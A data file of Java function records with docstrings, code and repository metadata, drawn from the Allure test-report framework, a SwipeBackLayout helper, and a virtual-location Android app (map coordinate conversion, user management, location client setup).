{"docstring": "/**\n * Tests scrollability within child views of v given a delta of dx.\n *\n * @param v      View to test for horizontal scrollability\n * @param checkV Whether the view v passed should itself be checked for\n *               scrollability (true), or just its children (false).\n * @param dx     Delta scrolled in pixels along the X axis\n * @param dy     Delta scrolled in pixels along the Y axis\n * @param x      X coordinate of the active touch point\n * @param y      Y coordinate of the active touch point\n * @return true if child views of v can be scrolled by delta of dx.\n */\n", "func_signal": "protected boolean canScroll(View v, boolean checkV, int dx, int dy, int x, int y)", "code": "{\n    if (v instanceof ViewGroup) {\n        final ViewGroup group = (ViewGroup) v;\n        final int scrollX = v.getScrollX();\n        final int scrollY = v.getScrollY();\n        final int count = group.getChildCount();\n        // Count backwards - let topmost views consume scroll distance\n        // first.\n        for (int i = count - 1; i >= 0; i--) {\n            // TODO: Add versioned support here for transformed views.\n            // This will not work for transformed views in Honeycomb+\n            final View child = group.getChildAt(i);\n            if (x + scrollX >= child.getLeft()\n                    && x + scrollX < child.getRight()\n                    && y + scrollY >= child.getTop()\n                    && y + scrollY < child.getBottom()\n                    && canScroll(child, true, dx, dy, x + scrollX - child.getLeft(), y\n                    + scrollY - child.getTop())) {\n                return true;\n            }\n        }\n    }\n\n    return checkV\n            && (ViewCompat.canScrollHorizontally(v, -dx) || ViewCompat.canScrollVertically(v,\n            -dy));\n}", "path": "SwipeBackLayout\\src\\main\\java\\me\\imid\\swipebacklayout\\lib\\ViewDragHelper.java", "repo_name": "kaku2015/WeatherAlarmClock", "stars": 528, "license": "None", "language": "java", "size": 63634}
{"docstring": "/**\n * Sets name, status, start time and title to specified step\n *\n * @param step which will be changed\n */\n", "func_signal": "@Override\npublic void process(Step step)", "code": "{\n    step.setName(getName());\n    step.setStatus(Status.PASSED);\n    step.setStart(System.currentTimeMillis());\n    step.setTitle(getTitle());\n}", "path": "allure-java-adaptor-api\\src\\main\\java\\ru\\yandex\\qatools\\allure\\events\\StepStartedEvent.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "// see https://github.com/allure-framework/allure-core/issues/880\n", "func_signal": "public void reportContainsTestForGroups()", "code": "{\n       // GIVEN: an TestNG suite with groups \n       TestNG testNG = new TestNG(false);\n       testNG.setTestSuites(singletonList(getClass().getClassLoader().getResource(\"suite-groups.xml\").getFile()));\n\n       // WHEN: executing\n       testNG.run();\n\n       // THEN: report only contains results for included groups\n       List<File> files = listTestSuiteFiles(resultsDir);\n       assertThat(files, hasSize(1));\n       File file = files.get(0);\n       TestSuiteResult result = unmarshal(file, TestSuiteResult.class);\n       assertThat(result.getTestCases(), hasSize(2));\n       List<String> status = new ArrayList<>();\n       for (TestCaseResult test : result.getTestCases()) {\n           status.add(test.getName() + \":\" + test.getStatus());\n       }\n       assertThat(status, containsInAnyOrder(\"inactiveIncludedTest:PENDING\", \"activeIncludedTest:PASSED\"));\n   }", "path": "allure-testng-adaptor\\src\\test\\java\\ru\\yandex\\qatools\\allure\\testng\\AllureTestListenerGroupsTest.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Sets title using fluent-api\n *\n * @param title value to set\n * @return modified instance\n */\n", "func_signal": "public StepStartedEvent withTitle(String title)", "code": "{\n    setTitle(title);\n    return this;\n}", "path": "allure-java-adaptor-api\\src\\main\\java\\ru\\yandex\\qatools\\allure\\events\\StepStartedEvent.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Set specified throwable to event using fluent-api interface\n *\n * @param throwable the throwable to set\n * @return modified instance\n */\n", "func_signal": "public StepFailureEvent withThrowable(Throwable throwable)", "code": "{\n    setThrowable(throwable);\n    return this;\n}", "path": "allure-java-adaptor-api\\src\\main\\java\\ru\\yandex\\qatools\\allure\\events\\StepFailureEvent.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Constructs an new event with specified binary attachment source, title and MIME-type\n *\n * @param attachment as byte array.\n * @param title      of attachment. Shown at report as name of attachment\n * @param type       MIME-type of attachment\n */\n", "func_signal": "public MakeAttachmentEvent(byte[] attachment, String title, String type)", "code": "{\n    setTitle(title);\n    setType(type);\n    setAttachment(attachment);\n}", "path": "allure-java-adaptor-api\\src\\main\\java\\ru\\yandex\\qatools\\allure\\events\\MakeAttachmentEvent.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * {@link Arrays#toString(Object[])} with {@link Arrays#toString(Object[])} for array elements\n */\n", "func_signal": "public static Object arrayToString(Object obj)", "code": "{\n    if (obj != null && obj.getClass().isArray()) {\n        int len = Array.getLength(obj);\n        String[] strings = new String[len];\n        for (int i = 0; i < len; i++) {\n            strings[i] = String.valueOf(Array.get(obj, i));\n        }\n        return Arrays.toString(strings);\n    } else {\n        return obj;\n    }\n}", "path": "allure-java-aspects\\src\\main\\java\\ru\\yandex\\qatools\\allure\\aspects\\AllureAspectUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Cut all characters from maxLength and replace it with \"...\"\n */\n", "func_signal": "public static String cutEnd(String data, int maxLength)", "code": "{\n    if (data.length() > maxLength) {\n        return data.substring(0, maxLength) + \"...\";\n    } else {\n        return data;\n    }\n}", "path": "allure-java-aspects\\src\\main\\java\\ru\\yandex\\qatools\\allure\\aspects\\AllureAspectUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Generate title using name pattern. First step all \"{method}\" substrings will be replaced\n * with given method name. Then replace all \"{i}\" substrings with i-th parameter.\n */\n", "func_signal": "public static String getTitle(String namePattern, String methodName, Object instance, Object[] parameters)", "code": "{\n    String finalPattern = namePattern\n            .replaceAll(\"\\\\{method\\\\}\", methodName)\n            .replaceAll(\"\\\\{this\\\\}\", String.valueOf(instance));\n    int paramsCount = parameters == null ? 0 : parameters.length;\n    Object[] results = new Object[paramsCount];\n    for (int i = 0; i < paramsCount; i++) {\n        results[i] = arrayToString(parameters[i]);\n    }\n\n    return cutEnd(MessageFormat.format(finalPattern, results), AllureConfig.newInstance().getMaxTitleLength());\n}", "path": "allure-java-aspects\\src\\main\\java\\ru\\yandex\\qatools\\allure\\aspects\\AllureAspectUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Open the given url in default system browser.\n */\n", "func_signal": "private void openBrowser(URI url) throws IOException", "code": "{\n    if (Desktop.isDesktopSupported()) {\n        Desktop.getDesktop().browse(url);\n    } else {\n        LOGGER.error(\"Can not open browser because this capability is not supported on \" +\n                \"your platform. You can use the link below to open the report manually.\");\n    }\n}", "path": "allure-commandline\\src\\main\\java\\ru\\yandex\\qatools\\allure\\command\\ReportOpen.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Write attachment from event using\n * {@link ru.yandex.qatools.allure.utils.AllureResultsUtils#writeAttachmentSafely(byte[], String, String)}\n * Then add attachment to step attachments.\n *\n * @param step to change\n */\n", "func_signal": "@Override\npublic void process(Step step)", "code": "{\n    Attachment attachment = writeAttachmentSafely(getAttachment(), getTitle(), getType());\n    step.getAttachments().add(attachment);\n}", "path": "allure-java-adaptor-api\\src\\main\\java\\ru\\yandex\\qatools\\allure\\events\\MakeAttachmentEvent.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Cut first (length-maxLength) characters and replace it with \"...\"\n */\n", "func_signal": "public static String cutBegin(String data, int maxLength)", "code": "{\n    if (data.length() > maxLength) {\n        return \"...\" + data.substring(data.length() - maxLength, data.length());\n    } else {\n        return data;\n    }\n}", "path": "allure-java-aspects\\src\\main\\java\\ru\\yandex\\qatools\\allure\\aspects\\AllureAspectUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Convert array of given parameters to sting.\n */\n", "func_signal": "public static String getParametersAsString(Object[] parameters, int maxLength)", "code": "{\n    if (parameters == null || parameters.length == 0) {\n        return \"\";\n    }\n    StringBuilder builder = new StringBuilder();\n    builder.append(\"[\");\n    for (int i = 0; i < parameters.length; i++) {\n        builder.append(arrayToString(parameters[i]));\n        if (i < parameters.length - 1) {\n            builder.append(\", \");\n        }\n    }\n    return cutEnd(builder.toString(), maxLength) + \"]\";\n}", "path": "allure-java-aspects\\src\\main\\java\\ru\\yandex\\qatools\\allure\\aspects\\AllureAspectUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Create Jackson mapper with {@link JaxbAnnotationIntrospector}\n *\n * @return {@link com.fasterxml.jackson.databind.ObjectMapper}\n */\n", "func_signal": "public static ObjectMapper createMapperWithJaxbAnnotationInspector()", "code": "{\n    ObjectMapper mapper = new ObjectMapper();\n    AnnotationIntrospector annotationInspector = new JaxbAnnotationIntrospector(TypeFactory.defaultInstance());\n    mapper.getSerializationConfig().with(annotationInspector);\n    return mapper;\n}", "path": "allure-report-data\\src\\main\\java\\ru\\yandex\\qatools\\allure\\data\\utils\\AllureReportUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * If directory doesn't exists try to create it.\n *\n * @param directory given directory to check\n * @throws ReportGenerationException if can't create specified directory\n */\n", "func_signal": "public static void checkDirectory(File directory)", "code": "{\n    if (!(directory.exists() || directory.mkdirs())) {\n        throw new ReportGenerationException(\n                String.format(\"Can't create data directory <%s>\", directory.getAbsolutePath())\n        );\n    }\n}", "path": "allure-report-data\\src\\main\\java\\ru\\yandex\\qatools\\allure\\data\\utils\\AllureReportUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Serialize specified object to directory with specified name.\n *\n * @param directory write to\n * @param name      serialize object with specified name\n * @param obj       object to serialize\n * @return number of bytes written to directory\n */\n", "func_signal": "public static int serialize(final File directory, String name, Object obj)", "code": "{\n    try (FileOutputStream stream = new FileOutputStream(new File(directory, name))) {\n        return serialize(stream, obj);\n    } catch (IOException e) {\n        throw new ReportGenerationException(e);\n    }\n}", "path": "allure-report-data\\src\\main\\java\\ru\\yandex\\qatools\\allure\\data\\utils\\AllureReportUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Change step status to {@link ru.yandex.qatools.allure.model.Status#FAILED} if\n * throwable instance of AssertionError and to {@link ru.yandex.qatools.allure.model.Status#BROKEN}\n * otherwise\n *\n * @param step which will be changed\n */\n", "func_signal": "@Override\npublic void process(Step step)", "code": "{\n    Status status = throwable instanceof AssertionError ? Status.FAILED : Status.BROKEN;\n    step.setStatus(status);\n}", "path": "allure-java-adaptor-api\\src\\main\\java\\ru\\yandex\\qatools\\allure\\events\\StepFailureEvent.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Generate method in the following format: {methodName}[{param1}, {param2}, ...]. Cut a generated\n * name is it over {@link ru.yandex.qatools.allure.config.AllureConfig#maxTitleLength}\n */\n", "func_signal": "public static String getName(String methodName, Object[] parameters)", "code": "{\n    int maxLength = AllureConfig.newInstance().getMaxTitleLength();\n    if (methodName.length() > maxLength) {\n        return cutBegin(methodName, maxLength);\n    } else {\n        return methodName + getParametersAsString(parameters, maxLength - methodName.length());\n    }\n}", "path": "allure-java-aspects\\src\\main\\java\\ru\\yandex\\qatools\\allure\\aspects\\AllureAspectUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Serialize specified object to directory with specified name. Given output stream will be closed.\n *\n * @param obj object to serialize\n * @return number of bytes written to directory\n */\n", "func_signal": "public static int serialize(OutputStream stream, Object obj)", "code": "{\n    ObjectMapper mapper = createMapperWithJaxbAnnotationInspector();\n\n    try (DataOutputStream data = new DataOutputStream(stream);\n         OutputStreamWriter writer = new OutputStreamWriter(data, StandardCharsets.UTF_8)) {\n        mapper.writerWithDefaultPrettyPrinter().writeValue(writer, obj);\n        return data.size();\n    } catch (IOException e) {\n        throw new ReportGenerationException(e);\n    }\n}", "path": "allure-report-data\\src\\main\\java\\ru\\yandex\\qatools\\allure\\data\\utils\\AllureReportUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Create directory with given name in specified directory. Check created directory using\n * {@link #checkDirectory(java.io.File)}\n *\n * @param parent specified parent directory\n * @param name   given name for directory to create\n * @return created directory\n * @throws ReportGenerationException if can't create specified directory\n */\n", "func_signal": "public static File createDirectory(File parent, String name)", "code": "{\n    File created = new File(parent, name);\n    checkDirectory(created);\n    return created;\n}", "path": "allure-report-data\\src\\main\\java\\ru\\yandex\\qatools\\allure\\data\\utils\\AllureReportUtils.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "/**\n * Set up server for report directory.\n */\n", "func_signal": "private Server setUpServer()", "code": "{\n    Server server = new Server(port);\n    ResourceHandler handler = new ResourceHandler();\n    handler.setDirectoriesListed(true);\n    handler.setWelcomeFiles(new String[]{\"index.html\"});\n    handler.setResourceBase(getReportDirectoryPath().toAbsolutePath().toString());\n    HandlerList handlers = new HandlerList();\n    handlers.setHandlers(new Handler[]{handler, new DefaultHandler()});\n    server.setStopAtShutdown(true);\n    server.setHandler(handlers);\n    return server;\n}", "path": "allure-commandline\\src\\main\\java\\ru\\yandex\\qatools\\allure\\command\\ReportOpen.java", "repo_name": "allure-framework/allure1", "stars": 711, "license": "apache-2.0", "language": "java", "size": 10916}
{"docstring": "//private final Lock lock = new ReentrantLock();\n", "func_signal": "public RetrofitHelper(Context context)", "code": "{\n    this.context = context;\n    okHttpClient = createOkHttpClient();\n    retrofit = createRetrofit(okHttpClient);\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\data\\net\\RetrofitHelper.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/* public AppInfo getInstallAppInfo(String packageName){\n     if(CommonUtils.isEmptyArray(installList)){\n         return null;\n     }\n\n     for (int i = 0; i < installList.size(); i++) {\n         String name = installList.get(i).getPackageName();\n         if (name.equals(packageName)) {\n             return installList.get(i);\n         }\n     }\n\n     return null;\n }\n*/\n", "func_signal": "@Override\n public void onInstallSuccess(List<AppInfo> infoList)", "code": "{\n     stopProgressDialog();\n     if(!CommonUtils.isEmptyArray(infoList)){\n         adapter.addData(adapter.getItemCount() - 1,infoList);\n     }\n\n }", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\ui\\MainActivity.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/*\n * Writes the user file in this format:\n *\n * <user flags=\"20039023\" id=\"0\">\n *   <name>Primary</name>\n * </user>\n */\n", "func_signal": "private void writeUserLocked(VUserInfo userInfo)", "code": "{\n    FileOutputStream fos = null;\n    AtomicFile userFile = new AtomicFile(new File(mUsersDir, userInfo.id + \".xml\"));\n    try {\n        fos = userFile.startWrite();\n        final BufferedOutputStream bos = new BufferedOutputStream(fos);\n\n        // XmlSerializer serializer = XmlUtils.serializerInstance();\n        final XmlSerializer serializer = new FastXmlSerializer();\n        serializer.setOutput(bos, \"utf-8\");\n        serializer.startDocument(null, true);\n        serializer.setFeature(\"http://xmlpull.org/v1/doc/features.html#indent-output\", true);\n\n        serializer.startTag(null, TAG_USER);\n        serializer.attribute(null, ATTR_ID, Integer.toString(userInfo.id));\n        serializer.attribute(null, ATTR_SERIAL_NO, Integer.toString(userInfo.serialNumber));\n        serializer.attribute(null, ATTR_FLAGS, Integer.toString(userInfo.flags));\n        serializer.attribute(null, ATTR_CREATION_TIME, Long.toString(userInfo.creationTime));\n        serializer.attribute(null, ATTR_LAST_LOGGED_IN_TIME,\n                Long.toString(userInfo.lastLoggedInTime));\n        if (userInfo.iconPath != null) {\n            serializer.attribute(null, ATTR_ICON_PATH, userInfo.iconPath);\n        }\n        if (userInfo.partial) {\n            serializer.attribute(null, ATTR_PARTIAL, \"true\");\n        }\n\n        serializer.startTag(null, TAG_NAME);\n        serializer.text(userInfo.name);\n        serializer.endTag(null, TAG_NAME);\n\n        serializer.endTag(null, TAG_USER);\n\n        serializer.endDocument();\n        userFile.finishWrite(fos);\n    } catch (Exception ioe) {\n        VLog.e(LOG_TAG, \"Error writing user info \" + userInfo.id + \"\\n\" + ioe);\n        userFile.failWrite(fos);\n    }\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u767e\u5ea6\u8f6cwgs\n *\n * @param point\n * @return\n */\n", "func_signal": "public static LatLngPoint bd2wgs(LatLngPoint point)", "code": "{\n//bd---gcj  \n    LatLngPoint gcjpt = bd2gcj(point);\n//gcj--wgs  \n    return gcj2wgs(gcjpt);\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\utils\\MapUtils.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Returns the next available user id, filling in any holes in the ids.\n * TODO: May not be a good idea to recycle ids, in case it results in confusion\n * for data and battery stats collection, or unexpected cross-talk.\n *\n * @return\n */\n", "func_signal": "private int getNextAvailableIdLocked()", "code": "{\n    synchronized (mPackagesLock) {\n        int i = mNextUserId;\n        while (i < Integer.MAX_VALUE) {\n            if (mUsers.indexOfKey(i) < 0 && !mRemovingUserIds.contains(i)) {\n                break;\n            }\n            i++;\n        }\n        mNextUserId = i + 1;\n        return i;\n    }\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u9500\u6bc1\u5b9a\u4f4d\n *\n */\n", "func_signal": "public void destroyLocation()", "code": "{\n    if (null != locationClient) {\n        /**\n         * \u5982\u679cAMapLocationClient\u662f\u5728\u5f53\u524dActivity\u5b9e\u4f8b\u5316\u7684\uff0c\n         * \u5728Activity\u7684onDestroy\u4e2d\u4e00\u5b9a\u8981\u6267\u884cAMapLocationClient\u7684onDestroy\n         */\n        locationClient.stop();\n        locationClient = null;\n        locationOption = null;\n        context = null;\n\n    }\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\component\\BMapSDKHelper.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Return first index of {@code value} in {@code array}, or {@code -1} if\n * not found.\n */\n", "func_signal": "public static <T> int indexOf(T[] array, T value)", "code": "{\n\tif (array == null) return -1;\n\tfor (int i = 0; i < array.length; i++) {\n\t\tif (ObjectsCompat.equals(array[i], value)) return i;\n\t}\n\treturn -1;\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\helper\\utils\\ArrayUtils.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u5bf9\u6570\u636e\u8fdb\u884c\u6392\u5e8f\n */\n", "func_signal": "private void sortDataByName(List<PinnedHeaderEntity<AppInfo>> list,\n                      List<String> sectionList,Map<String,List<AppInfo>> map)", "code": "{\n    Collections.sort(sectionList);//\u6309\u7167\u5b57\u6bcd\u91cd\u65b0\u6392\u5e8f\n\n    int position = 0;\n    for (int i = 0; i < sectionList.size(); i++) {\n        String headerName = sectionList.get(i);\n        indexMap.put(headerName, position);// \u5b58\u5165map\u4e2d\uff0ckey\u4e3a\u9996\u5b57\u6bcd\u5b57\u7b26\u4e32\uff0cvalue\u4e3a\u9996\u5b57\u6bcd\u5728listview\u4e2d\u4f4d\u7f6e\n\n        List<AppInfo> infos = map.get(sectionList.get(i));\n\n        if(infos != null && infos.size() != 0){\n            //list.add(new PinnedHeaderEntity<>(new AppInfo(), TYPE_HEADER,headerName));\n\n            for (int j = 0; j < infos.size(); j++) {\n                list.add(new PinnedHeaderEntity<>(infos.get(j), TYPE_DATA,headerName));\n            }\n        }\n\n        position = list.size() + 1;// \u8ba1\u7b97\u4e0b\u4e00\u4e2a\u9996\u5b57\u6bcd\u5728listview\u7684\u4f4d\u7f6e\n    }\n\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\ui\\presenter\\AppListPresenter.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u5f97\u5230\u9ed8\u8ba4\u7684\u5b9a\u4f4d\u53c2\u6570\n * @return\n */\n", "func_signal": "private LocationClientOption getDefaultOption()", "code": "{\n    LocationClientOption mOption = new LocationClientOption();\n    mOption.setCoorType(\"bd09ll\");//\u53ef\u9009\uff0c\u9ed8\u8ba4gcj02\uff0c\u8bbe\u7f6e\u8fd4\u56de\u7684\u5b9a\u4f4d\u7ed3\u679c\u5750\u6807\u7cfb\uff0c\u5982\u679c\u914d\u5408\u767e\u5ea6\u5730\u56fe\u4f7f\u7528\uff0c\u5efa\u8bae\u8bbe\u7f6e\u4e3abd09ll;\n    mOption.setScanSpan(0);//\u53ef\u9009\uff0c\u9ed8\u8ba40\uff0c\u5373\u4ec5\u5b9a\u4f4d\u4e00\u6b21\uff0c\u8bbe\u7f6e\u53d1\u8d77\u5b9a\u4f4d\u8bf7\u6c42\u7684\u95f4\u9694\u9700\u8981\u5927\u4e8e\u7b49\u4e8e1000ms\u624d\u662f\u6709\u6548\u7684\n    mOption.setIsNeedAddress(true);//\u53ef\u9009\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u5730\u5740\u4fe1\u606f\uff0c\u9ed8\u8ba4\u4e0d\u9700\u8981\n    mOption.setAddrType(\"all\");\n    mOption.setIsNeedLocationDescribe(true);//\u53ef\u9009\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u5730\u5740\u63cf\u8ff0\n    mOption.setNeedDeviceDirect(false);//\u53ef\u9009\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u8bbe\u5907\u65b9\u5411\u7ed3\u679c\n    mOption.setLocationNotify(false);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u5f53gps\u6709\u6548\u65f6\u6309\u71671S1\u6b21\u9891\u7387\u8f93\u51faGPS\u7ed3\u679c\n    mOption.setIgnoreKillProcess(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4true\uff0c\u5b9a\u4f4dSDK\u5185\u90e8\u662f\u4e00\u4e2aSERVICE\uff0c\u5e76\u653e\u5230\u4e86\u72ec\u7acb\u8fdb\u7a0b\uff0c\u8bbe\u7f6e\u662f\u5426\u5728stop\u7684\u65f6\u5019\u6740\u6b7b\u8fd9\u4e2a\u8fdb\u7a0b\uff0c\u9ed8\u8ba4\u4e0d\u6740\u6b7b\n    mOption.setIsNeedLocationDescribe(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u4f4d\u7f6e\u8bed\u4e49\u5316\u7ed3\u679c\uff0c\u53ef\u4ee5\u5728BDLocation.getLocationDescribe\u91cc\u5f97\u5230\uff0c\u7ed3\u679c\u7c7b\u4f3c\u4e8e\u201c\u5728\u5317\u4eac\u5929\u5b89\u95e8\u9644\u8fd1\u201d\n    mOption.setIsNeedLocationPoiList(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981POI\u7ed3\u679c\uff0c\u53ef\u4ee5\u5728BDLocation.getPoiList\u91cc\u5f97\u5230\n    mOption.SetIgnoreCacheException(false);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u6536\u96c6CRASH\u4fe1\u606f\uff0c\u9ed8\u8ba4\u6536\u96c6\n    return mOption;\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\component\\BMapSDKHelper.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Available for testing purposes.\n */\n", "func_signal": "private VUserManagerService(Context context, VPackageManagerService pm,\n                            Object installLock, Object packagesLock,\n                            File dataDir, File baseUserPath)", "code": "{\n    mContext = context;\n    mPm = pm;\n    mInstallLock = installLock;\n    mPackagesLock = packagesLock;\n    synchronized (mInstallLock) {\n        synchronized (mPackagesLock) {\n            mUsersDir = new File(dataDir, USER_INFO_DIR);\n            mUsersDir.mkdirs();\n            // Make zeroth user directory, for services to migrate their files to that location\n            File userZeroDir = new File(mUsersDir, \"0\");\n            userZeroDir.mkdirs();\n            mBaseUserPath = baseUserPath;\n//                FileUtils.setPermissions(mUsersDir.toString(),\n//                        FileUtils.S_IRWXU|FileUtils.S_IRWXG\n//                        |FileUtils.S_IROTH|FileUtils.S_IXOTH,\n//                        -1, -1);\n            mUserListFile = new File(mUsersDir, USER_LIST_FILENAME);\n            readUserListLocked();\n            // Prune out any partially created/partially removed users.\n            ArrayList<VUserInfo> partials = new ArrayList<VUserInfo>();\n            for (int i = 0; i < mUsers.size(); i++) {\n                VUserInfo ui = mUsers.valueAt(i);\n                if (ui.partial && i != 0) {\n                    partials.add(ui);\n                }\n            }\n            for (int i = 0; i < partials.size(); i++) {\n                VUserInfo ui = partials.get(i);\n                VLog.w(LOG_TAG, \"Removing partially created user #\" + i\n                        + \" (name=\" + ui.name + \")\");\n                removeUserStateLocked(ui.id);\n            }\n            sInstance = this;\n        }\n    }\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * \u56fd\u6d4b\u5c40\u8f6c\u767e\u5ea6\n *\n * @param point\n * @return\n */\n", "func_signal": "public static LatLngPoint gcj2bd(LatLngPoint point)", "code": "{\n    double gcjLon = point.getLng();\n    double gcjLat = point.getLat();\n    double x = gcjLon;\n    double y = gcjLat;\n    double z = Math.sqrt(x * x + y * y) + 0.00002 * Math.sin(y * x_pi);\n    double theta = Math.atan2(y, x) + 0.000003 * Math.cos(x * x_pi);\n    double bdLon = z * Math.cos(theta) + 0.0065;\n    double bdLat = z * Math.sin(theta) + 0.006;\n    return new LatLngPoint(bdLat, bdLon);\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\utils\\MapUtils.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * Removes a user and all data directories created for that user. This method should be called\n * after the user's processes have been terminated.\n *\n * @param userHandle the user's id\n */\n", "func_signal": "public boolean removeUser(int userHandle)", "code": "{\n    checkManageUsersPermission(\"Only the system can remove users\");\n    final VUserInfo user;\n    synchronized (mPackagesLock) {\n        user = mUsers.get(userHandle);\n        if (userHandle == 0 || user == null) {\n            return false;\n        }\n        mRemovingUserIds.add(userHandle);\n        // Set this to a partially created user, so that the user will be purged\n        // on next startup, in case the runtime stops now before stopping and\n        // removing the user completely.\n        user.partial = true;\n        writeUserLocked(user);\n    }\n    if (DBG) VLog.i(LOG_TAG, \"Stopping user \" + userHandle);\n    int res = VActivityManagerService.get().stopUser(userHandle,\n            new IStopUserCallback.Stub() {\n                @Override\n                public void userStopped(int userId) {\n                    finishRemoveUser(userId);\n                }\n\n                @Override\n                public void userStopAborted(int userId) {\n                }\n            });\n    return res == ActivityManagerCompat.USER_OP_SUCCESS;\n}", "path": "lib\\src\\main\\java\\com\\lody\\virtual\\server\\pm\\VUserManagerService.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
{"docstring": "/**\n * WGS84\u8f6cGCJ02\n *\n * @param point WGS84\n * @return\n */\n", "func_signal": "public static LatLngPoint wgs2gcj(LatLngPoint point)", "code": "{\n    LatLngPoint newpt;\n    if (isOutOfChina(point)) {\n        return point;\n    }\n    LatLngPoint d = delta(point);\n    newpt = new LatLngPoint(point.getLat() + d.getLat(), point.getLng() + d.getLng());\n\n\n    return newpt;\n}", "path": "app\\src\\main\\java\\com\\wstro\\virtuallocation\\utils\\MapUtils.java", "repo_name": "pengliangAndroid/VirtualLocation", "stars": 610, "license": "None", "language": "java", "size": 16021}
